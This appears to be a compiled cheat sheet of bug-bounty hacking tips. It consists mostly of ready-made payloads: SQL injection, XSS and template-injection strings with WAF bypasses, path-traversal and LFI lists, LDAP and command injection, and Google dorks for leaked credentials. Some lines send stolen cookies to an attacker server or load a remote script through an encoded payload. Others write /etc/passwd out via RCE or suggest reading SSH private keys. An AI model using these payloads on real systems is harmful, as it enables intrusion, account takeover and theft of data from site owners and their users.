  curl -X PURGE https://target[.]com
  If you receive a "status : ok" response with a random id, you might have found the issue!
  Bug: Unauthenticated Cache Purge
- You can try using the <iframe> tag for information disclosure via SSRF in generated PDFs
  <iframe src=file://etc/passwd>
- Google Dorks - File Storage:
  site:http://dropbox.com/s "example[.]com"
  site:http://box.com/s "example[.]com"
  site:http://docs.google.com inurl:"/d/" "example[.]com"
  Find sensitive information related to a company
- While testing a web after domain,com///evil,com it's redirecting me to evil,com.domain,com
  After 3+ hours of try finally i get a payload to get OR to evil,com
  Final paylaod : javascripT%3a%2f%2fevil,com%0D%0A%0D%0A
- A quick one liner to achieve the same in your terminal👇
  ===================
  curl -s 'https://crt.sh/?q=tesla.com&output=json…' --compressed -H 'User-Agent: Mozilla/5.0'|jq -r '.[].common_name,.[].name_value'|sort -u
  ===================
- HTML Injection at contact us form
  1- Visit sub[.]redacted[.]com/contact.php
  2- Fill the form, and in the fields type your Payloads :- for example :-
  "><h1>Hi Victim</h1>
  3- submit the form
  4- check your test email inbox
  - Phishing
- 🚨A directory traversal bug in a private Intigrity program.
  💥Payload: /****/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd
- Local files for Linux :
  /etc/passwd
  /etc/shadow
  /etc/shells
  /etc/group
  /etc/profile
  /etc/hosts
  /proc/self/environ
  /proc/self/status
  /proc/mounts
- add this file to your wordlist `.gitlab-ci.yml`
  its contain a database username and password
- Recently came across an endpoint http://api.redacted.com/../../../user which gets triggered when I click on "my profile". Changed endpoint from "user" to "users" & email addresses, first+last names, usernames, job position of all the registered users leaked!
- `id`
  `cat%20/etc/passwd`
  cmdi payloads
- PUT /user/123/profile HTTP/1.1
  Host: example[.]com
  Content-Type: application/json
  {
   "email": "user%40sixty[.]com"
  }
- Mass Port Scan using Naabu
  naabu -silent -nc -l <file contain live target list> -c 50 -tp 1000 -ep 21,80,1723,554,443,8080,8443
- add this to your wordlist /buildPasswordreset.xml
  its contain CVS repository credentials and Sensitive Information ...
- /api/v1/users/profile?id=MYID -> HTTP 200 with my data
  /api/v1/users/profile?id=ANOTHERUSERID -> HTTP 401
  /api/v1/users/profile?id=MYID&id=ANOTHERUSERID -> HTTP 200 with my data and the other user's data
- Add to your wordlist juicy-paths:
  /_vti_pvt/service.pwd
  /master.passwd/master.passwd.txt
  /servudaemon.ini
  /app/config/config.local.neon
  /app/etc/local.xml
  /home/000~ROOT~000
- Type: time-based blind
  Payload: pr=DR0802' WAITFOR DELAY '0:0:5'--&cat=&c=UK&lang=EN
  Tip: Test Everywhere!
- Add the file `configurations.xml` to your wordlist
- /test.aspx?file=../../web.config
- 🔰 Port scan using Naabu 🔰
  naabu -l targets.txt -rate 3000 -retries 3 -warm-up-time 0 -rate 150 -c 50 -ports 1-65535 -silent -o out.txt
- Tip :
  - Don't forget to add `assets/config.js` to your wordlist for JavaScript
- GET /api/organizations/ > 401/403 with two roles
  GET /api/organizations/all > 200 OK leaks all organizations
- [+] Using Google dorks for unique subdomains?
  Try this:
  site:*-*-*.yourtarget.com
  site:*-*.*.yourtarget.com
  site:*.*.*.yourtarget.com
- 🔰 Directory Listing - (Feroxbuster) Multiple values 🔰
  feroxbuster -u http://127.1 -x pdf -x js,html -x php txt json,docx
- RXSS on *.att.com
  Payload used : <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
- MSSQL blind Sql injection (time based):⚙️
  email=test@gmail.com' WAITFOR DELAY '0:0:5'--
- Google Dorks - Code Leaks
  site:pastebin. com "example. com"
  site:jsfiddle. net "example. com"
  site:codebeautify. org "example. com"
  site:codepen. io "example. com"
- 🔰 Encoded Traversal Strings
  ../
  ..\
  ..\/
  %2e%2e%2f
  %252e%252e%252f
  %c0%ae%c0%ae%c0%af
  %uff0e%uff0e%u2215
  %uff0e%uff0e%u2216
  ..././
  ...\.\
- 🔰 This is how you get IP ranges within that ASN
  whois -h http://target.com -- '-i origin AS714' | grep -Eo "([0-9.]+){4}/[0-9]+" | uniq
- 📚 Extract API endpoints from javascript files
  Here’s a quick one-liner for extracting API endpoints from javascript files:
  cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u
- Add the file `yahoo_site_admin/credentials/db.conf` to your wordlist
- FastAdmin LFI
  Payload: ..//..//application/database
- 📚 One liner - CVE-2022-0378
  cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
- 📚 BugCrowd Programs
  curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json… | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
- Add the file `yahoo_site_admin/credentials/db.conf` to your wordlist, and you might discover some juicy data.
- Add the file `wp-config.php.bk` to your wordlist
- 📚 Get Subdomains from VirusTotal
  curl -s "https://virustotal.com/ui/domains/HOST/subdomains?limit=40…" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
- 📚 Get Subdomains With http://sonar.omnisint.io
  curl --silent https://sonar.omnisint.io/subdomains/HOST | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u
- old but till alive
  https://www .target .com/go?redirectTo=https://linkedin .com%2Fcompany%2Ftarget
  When i click soical media link i find this Url then I change to www .target .com/go?redirectTo=javascript​:alert(1);
  Payload:
  javascript​:alert(1); //Evil. com
- 🚀 Hunt Down Sneaky Open Redirects
  gau http://vuln.target.com | gf redirect | qsreplace “$LHOST” | xargs -I % -P 25 sh -c ‘curl -Is “%” 2>&1 | grep -q “Location: $LHOST” && echo “VULN! %”’
- sastsweep for web3 bug bounties:
  1) instead of h1 use bbscope with `immunefi` flag or `bugbounty-companion immunefi sync unique` (needs a fix tho)
  2) use `-config` arg to specify the path to https://github.com/Decurity/semgrep-smart-contracts… or https://github.com/tintinweb/semgrep-rules…
- 𝗜𝗗𝗢𝗥 𝘁𝗼 𝗔𝗱𝗺𝗶𝗻 𝗮𝗰𝗰𝗼𝘂𝗻𝘁 𝘁𝗮𝗸𝗲𝗼𝘃𝗲𝗿 [critical]
  http://dev.target.com/api/seller/uid was disclosing user emails
  first user in a site are always admin.
  Enumerated emails of user 1 to 10
  One email was `𝙩𝙖𝙧𝙜𝙚𝙩@𝙮𝙤𝙥𝙢𝙖𝙞𝙡.𝙘𝙤𝙢`
- Add the file `config.php.bak` to your wordlist
- 🚀 Google Dorking - Wordpress files
  site:[TARGET] AND (inurl:wp-content | inurl:wp-includes)
  site:[TARGET] inurl:wp-config.php intext:DB_PASSWORD
  site:[TARGET] intitle:"Index of" wp-admin
- 🚀 LDAP Injection Payloads
  *
  *)(&
  *))%00
  )(cn=))\x00
  *()|%26'
  *()|&'
  *(|(mail=*))
  *(|(objectclass=*))
  *)(uid=*))(|(uid=*
  */*
  *|
  /
  //
  //*
  |
  admin*
  admin*)((|userpassword=*)
  admin*)((|userPassword=*)
  x' or name()='username' or 'x'='y
- Add the file `yahoo_site_admin/credentials/db.conf` to your wordlist
- Add the file `wp-config.php.txt` to your wordlist
- Add the file `wp-config.php.txt` to your wordlist
- Use feroxbuster to differentiate targets w.r.t response codes
  cat targets | ./feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files
- Add the file `appsettings.jsont` to your wordlist
- Payload used : {{constructor.constructor('eval(atob(\'dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3Rlc3QtdGVzdCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsmIzYxOyYjNjE=\'))')()}}
- Payloads for LFR/LFD ⚔️
  file:/etc/passwd%3F/
  file:/etc%252Fpasswd/
  file:/etc%252Fpasswd%3F/
  file:///etc/%3F/../passwd
  file:${br}/et${u}c%252Fpas${te}swd%3F/
  file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
- Tip: phpinfo in /info.php
- GitHub profiles of the company's employees.
  "Seeing something unexpected? Take a look at the
  GitHub profile guide." "tesla" site:http://github.com
- Got an RCE in a background process with no outbound network so you need to exfil to webroot without knowing the location?
  All you need to know is a uniue filename in the webroot.
  $( cat /etc/passwd > $(find / -name  2>/dev/null).txt )
- intercept HTTPS traffic of App
  1. Decompile
  2. Replace 'https' with 'http' in all small files
  find. -type f -exec sed -i 's/https\:\/\//http\:\/\//g' {} +
  3. Build
  4. Redirect req. to 443
  Proxy-Options-Edit-Request Handling
- Fuzzing always win
  example .com/.env always continue critical data
- Fuzzing always win
  example .com/.env always continue critical data
- `Accept: ../../../../../../../../../../etc/passwd{{`
- Payload: (select*from(select(sleep(15)))a)
- intitle:"GeoServer: Welcome" site:*.edu.*
  intitle:"GeoServer: Welcome" site:*.edu
- %6c%75%33%6b%79%31%33' AND 1=CAST((SELECT version()) AS int) --
- add templates/processed/config.ini to your wordlist you can end up getting a CRITICAL😎
- If you got an api like /gps/v1/
  check out -> /gps/v1/signature
- Crazy Aliyun WAF Bypass:
  cat /etc/hosts - triggers WAF
  tac /etc/hosts - 🧙‍♂️
- Exploit RCE via Groovy Console
  Shodan: http://ssl.cert.subject.cn:*.taarget.com http.title:"Dashboard [Jenkins]"
  Payload: println "cat /etc/passwd".execute().text
- Sensitive Files by Fuzzing Key .git Paths.⚔️
  /.git
  /.gitkeep
  /.git-rewrite
  /.gitreview
  /.git/HEAD
  /.gitconfig
  /.git/index
  /.git/logs
  /.svnignore
  /.gitattributes
  /.gitmodules
  /.svn/entries
- 🕵️‍♂️Tip:
  Remove URL parts to check for data leaks. /api/endpoint/{id} ➡️ /api/endpoint/ — sometimes the parent endpoint exposes everything!
- Always check for ID’s disclosed in response:
  1. Found a json POST request without user ID to fetch user information in the response
  2. Adding new parameter “user_id”:<victims ID> in the request body
  3. Victims full PII details fetched in response
- Burp Suite configuration file for any HackerOne public program:
  ```
  curl http://term.rohsec.com/burp_config/paypal…
  ```
- Web Cache Deception is one of the easiest wins in bugbounties.
  try using special chars like ; with js files to cache the response serverside
  for example /user/profile.js,
  see if the user's data is cached and accessible with an incognito tab/other user account
- Tips: <a href="javascript:alert(document.cookie)">Click me</a> inject in search-bar for example, and you can send the cookies to your server : <a href="javascript:location.href='http://yourserver.com/log?c='+docume%27+document.cookie…">Click me</a>
- Discover Endpoints from JavaScript Files
  cat js-urls.txt | while read url; do curl -s $url; done | grep -Eo "/[a-zA-Z0-9_/.-]+\.(php|asp|aspx|jsp|json|html|js)"
  Scan JS files for hidden endpoints.
- Get only query/mutation name, sorted unique
  grep -Eo '(query|mutation) [a-zA-Z0-9_]+\(' HTTPX_RESPONSE/ -R | cut -d' ' -f2 | cut -d"(" -f1 | sort -u
  Then you can search for query/mutation name in directory js files
- Using waybackurls to Detect Hidden API Versions
  echo "http://target.com" | waybackurls | grep -E "/v[0-9]+/" | tee apis.txt
  Outdated API versions often contain unpatched vulnerabilities.
- Simple Open Redirect Detection
  curl -I "https://target.com/redirect?url=https://evil.com…"
  If server responds with 3xx redirect to your malicious URL — reportable Open Redirect vulnerability!
- Cloudflare bypassed !⚙️
  "-alert(0)-" >>blocked
  "-top['al\x65rt']('XD')-" >>passed
- => Privilege escalations allow to Edit Existing Team & Create a NEW team.
  PUT /v4/catalogos/grupos/1BBDB79F = 401
  PUT catalogos/grupos/1BBDB79F = 200 OK
- Tip: Wordpress config /old/wp-config.php.bak
- Org Owner: disables feedbacks
  Atkr: crafts (POST then PUT) request
  ```
  POST /v3/group_channels/<chat_url>/messages/<bot_message_id>/feedbacks HTTP/2
  ....
  {"rating":"bad", "comment":"attacker message"}
  ```
  --
- Bypassed CloudFlare using this payload : ⚔️
  "><x/Onpointerrawupdate=confirm(document.cookie)>Sojal_brokenyou
- Input field is vulnerable to CSTI however ' and " are converted to HTML entities so simple payload were not working.
  Found a Payload:
  {{x=http://valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
- redacted[.]com/ --> [302]❌
  redacted[.]com/app/api/doc/ --> [200 OK] ✅
  Bypassed the 302 and hit API doc gold!
- TIP :
  DELETE /api/v1/user → blocked
  PATCH then DELETE /api/v1/user → works
- When directory bruteforcing always try with different methods
  GET —> POST —> PUT ♻️
  I was able to GET /api/v2/user details but not authorised to update the user. PUT was enabled.
- Tip: ../../test.htm
  1- http://test.com/file/res-30Y1i…
  2- http://test.com/test.html
- Which method will pop up first? Why?
  `${{valueOf:_=>alert`` ,toString:_=>prompt`` }}`+1
- hardcoded credentials in javascript file xxxxxxx/static/js/main.xxxxx.chunk.js 🗣️ dp
- When you come across a puppetDB instance dont forget to check the endpoint /pdb/query/v4/resources
- Payload: "><input%20onfocus=alert(1)%20autofocus> bypassed
- Shodan+Nuclei (@pdnuclei ): Got LFI? Don't stop at /etc/passwd. Try reading private SSH keys (~/.ssh/id_rsa) to get a direct shell. 🐚
- $ cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u
- Adding a dummy guid gives access to endpoints which were giving 404 and 403 before.
  just like url/FUZZ?guid=00000000-0000-0000-0000-000000000000
- General Bug Bounty Dorks:-
  inurl:/bug-bounty "security"
  inurl:/security "bug bounty"
  inurl:/security.txt "bug bounty"
  inurl:/.well-known/security.txt "bug bounty"
  inurl:security.txt intext:"mailto" -github.com -wikipedia.org -portswigger.net -magento
- If you're using OpenCode (AI coding agent), update to v1.0.216 NOW (CVE-2026-22812) 🚨.
  Unauth RCE via POST /session/{id}/shell. No login, no tokens, just direct command execution. eg: /etc/passwd and ...etc
- bugTricks#
  I love this dorks because I can fast focus BAC bugs
  I recommended searching duckduckgo, google, yandex and bing search ✌️
  site:http://apple.com inurl:portal
  site:http://apple.com inurl:/portal
- Finding the right SQLi payload isn’t always easy.
  If you can’t craft custom logic, use Time-Based techniques to prove control.
  ';IF(LEN(USER_NAME())>=5)WAITFOR DELAY '0:0:20'--
- Bypass of Open Redirect Fix on http://lovable.dev via /..// Path Traversal in redirect parameter
  https://hackerone.com/reports/3599248
- Possible open redirect parameters:
  As a beginner we can check it out
  1. ?url=http://{target}
  2. ?url=$2f%2f{target}
  3. /cgi-bin/redirect.cgi?{target}
- Finding the right SQLi payload isn’t always easy
  ';IF(LEN(USER_NAME())>=5)WAITFOR DELAY '0:0:20'--
- "key":"modifiedvalue123" = 400 Bad Request
  "key":null = 200 OK
- 💡 Rate limits protect endpoints, not intent.
  If /api/myprofile is blocked after 100 reqs:
  → try /api/myProfile (case)
  → try /api/myprofile%00 (null byte)
  → try /api/myprofile?junk=§n§ (param noise)
  The backend doesn't care.
  The rate limiter does.
- Time-Based SQL Injection Is Still Everywhere!🔥
  You can fingerprint the backend DB version with
  '; IF (SUBSTRING(@@VERSION,1,1) = 'M') WAITFOR DELAY '0:0:10' --
  Delay = proof.
- ## Not worked :-❌
  curl -i "https://sub[.]target[.]com/%0D%0AX-Frame-Options:ALLOWALL"
  ## bypassed :- ✅
  curl --http1.1 -i "https://sub[.]target[.]com/%0D%0AX-Frame-Options:ALLOWALL"
- TIP :
  DELETE /{feature}/v1/{feature}/ID
  Cookies:####→ blocked
  Remove Cookies header → works !
- When you encounter a 403 Forbidden page 🚫 ,try adding an "X-Client-IP" header in your request with the value "127.0.0.1"
  X-Client-IP: 127.0.0.1
  OR
  curl -I https://target[.]com/.env -H "X-Client-IP: 127.0.0.1"
  It doesn't always work, but worth trying. 🎯
- curl -s -X GET https://target-com/xxx/wc/v3/payment_gateways \
   -u "ck_xxxxxxxxxxxxxxxxxxxx:cs_xxxxxxxxxxxxxxxxxxxx" | jq
- Found a path normalization issue where encoding U as %55 bypassed authentication.
  GET /scim/v2/{org}/%55sers/{user_id} HTTP/2
  /Users/... → 401
  /%55sers/... → 200 OK
  The endpoint returned the SCIM user object without authentication.
- /etc/passwd ==> WAF restriction? Use these:
  /e?c/?asswd
  /e*c/*asswd
  /??c/?asswd
  /??c/?assw?
  Doesn't work always, just give it a try. 🎯
